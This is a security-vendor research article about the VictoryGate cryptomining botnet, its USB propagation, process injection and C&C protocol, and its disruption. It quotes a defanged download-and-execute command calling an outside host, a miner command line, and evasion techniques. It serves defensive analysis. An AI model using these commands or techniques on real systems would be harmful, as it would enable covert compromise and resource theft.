<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Alan Warburton',
        'ArticleCategory': 'Botnet',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted | WeLiveSecurity</title>
<meta name="description" content="ESET researchers have discovered a botnet that they named VictoryGate and that spread to 35,000 devices in Latin America via malware-laden USB drives. The researchers also subsequently led an international effort that disrupted the botnet."/>
<link rel="canonical" href="https://www.welivesecurity.com/2020/04/23/eset-discovery-monero-mining-botnet-disrupted/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers have discovered a botnet that they named VictoryGate and that spread to 35,000 devices in Latin America via malware-laden USB drives. The researchers also subsequently led an international effort that disrupted the botnet." />
<meta property="og:url" content="https://www.welivesecurity.com/2020/04/23/eset-discovery-monero-mining-botnet-disrupted/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Botnet" />
<meta property="article:published_time" content="2020-04-23T09:30:57+00:00" />
<meta property="article:modified_time" content="2020-10-12T08:51:19+00:00" />
<meta property="og:updated_time" content="2020-10-12T08:51:19+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/04/ESET-usb-drives-monero-mining-botnet-disrupted.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2020/04/ESET-usb-drives-monero-mining-botnet-disrupted.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="667" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers have discovered a botnet that they named VictoryGate and that spread to 35,000 devices in Latin America via malware-laden USB drives. The researchers also subsequently led an international effort that disrupted the botnet." />
<meta name="twitter:title" content="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/04/ESET-usb-drives-monero-mining-botnet-disrupted.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel="alternate" href="https://www.welivesecurity.com/2020/04/23/eset-discovery-monero-mining-botnet-disrupted/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2020/04/23/victorygate-disrumpen-botnet-minar-criptomonedas-afecta-peru/" hreflang="es" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/04/23/victorygate-disrumpen-botnet-minar-criptomonedas-afecta-peru/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/04/23/victorygate-disrumpen-botnet-minar-criptomonedas-afecta-peru/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2020/04/ESET-monero-mining-botnet-usb-disrupted.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted</h1>
<div class="excerpt">ESET researchers discover, and play a key role in the disruption of, a 35,000-strong botnet spreading in Latin America via compromised USB drives</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/alan-warburton/" title="Alan Warburton">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2019/09/Alan-warburton-BN-wls.jpg" alt="Alan Warburton">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/alan-warburton/" title="Alan Warburton">
                    Alan Warburton                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2020-04-23 11:30:57">23 Apr 2020 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F&text=Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET researchers discover, and play a key role in the disruption of, a 35,000-strong botnet spreading in Latin America via compromised USB drives</p>
                            </div>

                            <p>ESET researchers recently discovered a previously undocumented botnet that we have named VictoryGate. It has been active since at least May 2019 and, since then, three different variants of the initial module have been identified, in addition to approximately 10 secondary payloads that are downloaded from file hosting websites. The initial module is detected by ESET security products as MSIL/VictoryGate.</p>
<p>This botnet is composed mainly of devices in Latin America, specifically Peru, where over 90% of the compromised devices are located. We’ve been actively sinkholing several command and control (C&amp;C) domains, allowing us to monitor this botnet’s activity. The combination of the sinkhole data and our telemetry data allows us to estimate the botnet’s size to be at least 35,000 devices.</p>
<p>To control its botnet, VictoryGate used only subdomains registered at the dynamic DNS provider No-IP. ESET reported the malicious subdomains to No-IP, who swiftly took them all down, effectively removing control of the bots from the attacker. Also, ESET is collaborating with non-profit Shadowserver Foundation by sharing sinkhole logs in an effort to further remediate this threat.</p>
<p>In Figure 1 you can see the peak number of unique IP addresses connecting to the C&amp;C per day.</p>
<div id="attachment_137484" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-1-5.png"><img class="wp-image-137484" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-1-5-300x126.png" alt="" width="750" height="315" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-1-5-300x126.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-1-5-768x322.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-1-5.png 922w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 1. Connections to the C&amp;C</i></p></div>
<p>The main activity of the botnet was <a href="https://www.welivesecurity.com/2018/03/28/monero-cryptocurrency-malwares-rising-star/" target="_blank" rel="noopener">Monero mining</a>. However, given that the botmaster was able to issue commands to the nodes to download and execute new secondary payloads at any given time, this could have changed at some point. This posed a considerable risk, given that we’ve identified compromised network traffic that stems from the public sector and from organizations in the private sector, including financial institutions.</p>
<p>The impacts on the victim’s device are:</p>
<ul>
<li>Very high resource usage. In all the payloads we analyzed, the malicious code uses all available threads to perform cryptomining, which results in a sustained 90-99% CPU load. This slows down the device, causes overheating and possibly even damage.</li>
<li>Files that are contained on USB drives are hidden when connecting to an infested machine. This is part of the propagation mechanism that we’ll discuss shortly.</li>
</ul>
<p>We’ll cover some of the technical aspects of this threat in this post.</p>
<h2>What is VictoryGate?</h2>
<p>This is the name we’ve given to the initial module that receives and executes commands from the C&amp;C server. It also implements the propagation mechanism and establishes persistence on victimized devices.</p>
<h3>Propagation</h3>
<p>The only propagation vector we have been able to confirm is through removable devices. The victim receives a USB drive that at some point was connected to a compromised machine. It seemingly has all the files with the same names and icons that it contained originally. Because of this, the contents will look almost identical at first glance, as seen in the example in Figure 2. However, the original files have been copied to a hidden directory in the root of the drive and Windows executables have been provided as apparent namesakes.</p>
<div id="attachment_137485" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-2-5.png"><img class="wp-image-137485" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-2-5-300x129.png" alt="" width="750" height="323" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-2-5-300x129.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-2-5.png 713w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 2. Comparison of a drive pre- and post-compromise with default Explorer options</i></p></div>
<p>In fact, these executables are AutoIt scripts that are compiled on the fly by VictoryGate, using the template in Figure 3. It is worth noting that the build process will also add random metadata to each file so that any two compiled scripts will most likely never have the same hash.</p>
<div id="attachment_137486" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6.png"><img class="wp-image-137486" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6-300x96.png" alt="" width="750" height="240" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6-300x96.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6-768x245.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6-1024x327.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-3-6.png 1340w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 3. The template used by VictoryGate to compile the propagation scripts</i></p></div>
<p>When an unsuspecting user “opens” (i.e. executes) one of these files, the AutoIt script will open both the file that was intended, in addition to the initial module (see Figure 4), both hidden by VictoryGate in a hidden directory as mentioned above.</p>
<div id="attachment_137487" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-4-3.png"><img class="wp-image-137487" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-4-3-300x41.png" alt="" width="750" height="102" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-4-3-300x41.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-4-3-768x105.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-4-3.png 974w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 4. Propagation script that shows launching a regular file along with executing the malicious module</i></p></div>
<p>Once the initial module is executed, it will create a copy of itself in <span style="font-family: courier new, courier, monospace;">%AppData%</span> (with a nicer name like <span style="font-family: courier new, courier, monospace;">ctfmon2.exe</span>) and a shortcut in the startup folder pointing to this copy, as a simple mechanism to gain persistence upon system boot.</p>
<p>This module is an approximately 200 MB .NET assembly that contains a huge array with garbage bytes. This is likely done to avoid scanning by some security products that have file size or other resource consumption limits. The array also contains an XORed and gzip-compressed DLL that, at runtime, is deciphered and loaded with a late binding call using the .NET Reflection API.</p>
<p>The DLL itself contains a packed AutoIt-compiled script like the one seen in Figure 3, as well as the methods required to inject it into some legitimate Windows process. We’ve seen <span style="font-family: courier new, courier, monospace;">vbc.exe</span> (Visual Basic Compiler) or <span style="font-family: courier new, courier, monospace;">csc.exe</span> (Visual C# Compiler) being targeted.</p>
<p>The injection is done by creating an instance of the <span style="font-family: courier new, courier, monospace;">vbc.exe</span> process in a suspended state, unmapping its memory sections and then loading the executable from memory. As can be seen in Figure 5, VictoryGate will use several undocumented NTAPI functions such as <span style="font-family: courier new, courier, monospace;">NtWriteVirtualMemory</span>, rather than using the more common API function <span style="font-family: courier new, courier, monospace;">WriteProcessMemory</span>, to avoid basic API-hooking detection.</p>
<div id="attachment_137488" style="width: 651px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-5-1.png"><img class="wp-image-137488 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-5-1.png" alt="" width="641" height="140" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-5-1.png 641w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-5-1-300x66.png 300w" sizes="(max-width: 641px) 100vw, 641px" /></a><p class="wp-caption-text"><i>Figure 5. </i><span style="font-family: courier new, courier, monospace;">vbc.exe</span><i> process injection performed by VictoryGate</i></p></div>
<p>The injected AutoIt agent is responsible for communication with the C&amp;C server, download and execution of the secondary payloads, and also will constantly scan to detect whether a new USB drive has been connected and, if so, will replace the files that it contains with propagation scripts and hide the original files.</p>
<h3>Communication with C&amp;C servers</h3>
<p>As mentioned before, the botmaster had the ability to send commands to the nodes to add new secondary payloads. These commands were issued using a custom protocol and uncommon ports as cleartext. The following commands were supported:</p>

<table id="tablepress-808" class="tablepress tablepress-id-808">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Command</th><th class="column-2">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">!</td><td class="column-2">The C&amp;C tells the node to download a file from a given URL and then execute it. The node will also use the prefix to notify the C&amp;C that the task has been completed without errors.</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">~</td><td class="column-2">The node uses this prefix to notify the C&amp;C that there has been an error while performing the task.</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">-</td><td class="column-2">This prefix is used by the node during the first message to the C&amp;C, where it sends information about the system such as username, hostname, antimalware product installed, AutoIt version, etc. After that, it is used as a Keep-Alive between server and client.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">_</td><td class="column-2">The node notifies the C&amp;C that the current execution path is different than the one expected. This will also trigger the same mechanism that is used when the file is executed from the USB drive – it will copy itself to <span style="font-family: courier new, courier, monospace;"> %AppData%</span>.</td>
</tr>
</tbody>
</table>

<p>Here is a defanged example of a download-and-execute command:</p>
<p style="text-align: center;"><span style="font-family: courier new, courier, monospace;">!|N-I-C-H-O-L-A-S|!|N-I-C-H-O-L-A-S|PuQPQOZOy.exe|N-I-C-H-O-L-A-S|http://gulfup[.]me/i/00711/2czcy5xvh7br.jpeg[N-E-K]</span></p>
<p>where the URL is the payload to download to the <span style="font-family: courier new, courier, monospace;">%temp%</span> directory and <span style="font-family: courier new, courier, monospace;">PuQPQOZOy.exe</span> is a randomly-generated name to be assigned to the file once it is downloaded.</p>
<h4><strong>Downloaded payloads</strong></h4>
<p>Downloaded payloads are typically AutoIt-compiled scripts as well. The AutoIt compiler has the ability to bundle binaries with the script, in one standalone file. These binaries can then be executed by the script using the <span style="font-family: courier new, courier, monospace;">AutoIt ShellExecute</span> function when the compiled executable is run. When executed, this file will first create a scheduled task and another shortcut in the startup folder to gain persistence for this new binary. The execution of the downloaded payload in most of the samples analyzed is the following:</p>
<div id="attachment_137489" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6.jpg"><img class="wp-image-137489" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6-272x300.jpg" alt="" width="750" height="827" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6-272x300.jpg 272w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6-768x847.jpg 768w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6-929x1024.jpg 929w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-6.jpg 1128w" sizes="(max-width: 750px) 100vw, 750px" /></a><p class="wp-caption-text"><i>Figure 6. Workflow of the downloaded payload</i></p></div>
<p>Again, this payload will try to inject code into a legitimate Windows process; this time it’ll inject the XMRig mining software into the <span style="font-family: courier new, courier, monospace;">ucsvc.exe</span> (Boot File Servicing Utility) process.</p>
<p>Once executed, <span style="font-family: courier new, courier, monospace;">tpmvscugr.exe</span> will first decipher a Rijndael-encrypted array, which is a packed binary that we call <span style="font-family: courier new, courier, monospace;">gate.exe</span> – its methods are then invoked using the .NET Reflection API as seen in the previous stage.</p>
<p>This packed binary doesn’t have the necessary code to perform the injection itself; rather, the last piece of code required to inject the <span style="font-family: courier new, courier, monospace;">ucsvc.exe</span> process is a DLL downloaded from the C&amp;C that is first stored in a registry key (see Figure 7) and then loaded into the <span style="font-family: courier new, courier, monospace;">tpmvscugr.exe</span> process memory during runtime.</p>
<div id="attachment_137492" style="width: 546px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-7-2.png"><img class="wp-image-137492 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-7-2.png" alt="" width="536" height="326" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-7-2.png 536w, https://www.welivesecurity.com/wp-content/uploads/2020/04/Figure-7-2-300x182.png 300w" sizes="(max-width: 536px) 100vw, 536px" /></a><p class="wp-caption-text"><i>Figure 7. Registry key containing</i> <span style="font-family: courier new, courier, monospace;">auto.dll</span></p></div>
<p>This DLL (<span style="font-family: courier new, courier, monospace;">auto.dll</span>) is sent through network traffic using gzip compression and AES encryption. The key to decipher it has to be recovered from the communication between the C&amp;C and the node. It is then loaded during execution by performing a late call. It contains some typical <a href="https://www.andreafortuna.org/2017/11/22/runpe-a-practical-example-of-process-hollowing-technique/" target="_blank" rel="noopener">RunPE</a> functions that allow <span style="font-family: courier new, courier, monospace;">gate.exe</span> to perform the injection.</p>
<h4><strong>Monero mining</strong></h4>
<p>Once the <span style="font-family: courier new, courier, monospace;">ucsvc.exe</span> process is injected with the XMRig miner, the C&amp;C will start the mining on the node by passing a command like the following:</p>
<p><span style="font-family: courier new, courier, monospace;">C:\Windows\system32\ucsvc.exe -algo cryptonight -url &lt;Redacted&gt;:19019 –user CPU_x64 –pass x –retries=50 –retry-pause=1 –keepalive –donate-level=1 –nicehash</span></p>
<p>The IP address seen in the command is actually not a mining pool, but a stratum proxy – or XMRig Proxy. Also, in order to hide the CPU usage from the user, the mining process will be terminated if the user opens Task Manager; mining will be resumed as soon as TM is closed. This technique has been seen in many other threats of this kind.</p>
<p>From the data collected during our sinkholing activities we can determine that there are, on average, 2,000 devices mining throughout the day. If we estimate an average hashrate of 150H/s, we could say that the authors of this campaign have collected at least 80 Monero (approximately US$6000) from this botnet alone.</p>
<h2>Conclusion</h2>
<p>VictoryGate is a new botnet that uses USB drives to propagate, a technique that we’ve seen repeatedly over the years in Latin America. The usage of AutoIt and XMRig to develop cryptomining malware is also a trend that has seen a recent increase.</p>
<p>One of the interesting characteristics about VictoryGate is that it shows a greater effort to avoid detection than previous, similar campaigns in the region. However, the most interesting factor of this investigation has been our ability to register unused domain names hardcoded into the malware samples, allowing us to sinkhole a significant part of the C&amp;C infrastructure and share the collected data with Shadowserver in order to remediate this attack. No-IP was also helpful in taking down the main domain names used by the botnet, which disrupted at least a portion of the botnet.</p>
<p>Despite our efforts, compromised USB drives will continue to circulate and new infestations will still occur. The main difference is that the bots will no longer receive commands from the C&amp;C. This will prevent new victims from downloading secondary payloads from the internet. However, those PCs that were afflicted prior to the disruption may continue to perform cryptomining on behalf of the botmaster. We provide a free tool to clean your PC if you think it has been compromised by this malware: you can use <a href="https://www.eset.com/int/home/online-scanner/" target="_blank" rel="noopener">ESET Online Scanner</a> to effectively remove this threat.</p>
<h2>Indicators of Compromise (IOCs)</h2>
<h3>Samples</h3>
<p><span style="font-family: courier new, courier, monospace;">
<table id="tablepress-809" class="tablepress tablepress-id-809">
<thead>
<tr class="row-1 odd">
	<th class="column-1">ESET detection name<br />
</th><th class="column-2">Hash<br />
</th>
</tr>
</thead>
